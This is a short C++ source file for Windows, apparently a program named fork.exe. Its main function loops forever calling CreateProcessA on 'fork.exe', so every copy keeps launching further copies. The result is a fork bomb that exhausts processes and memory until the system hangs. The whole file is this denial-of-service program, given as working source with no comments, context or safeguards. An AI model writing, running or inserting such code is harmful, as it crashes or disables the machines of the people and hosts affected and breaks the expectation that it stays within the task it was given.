#define _CRT_SECURE_NO_WARNINGS
#include <cstdio>
#include <windows.h>

int main(int argc, char** argv) {
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    while (1) {
	    CreateProcessA("fork.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
    }
    return 0;
}
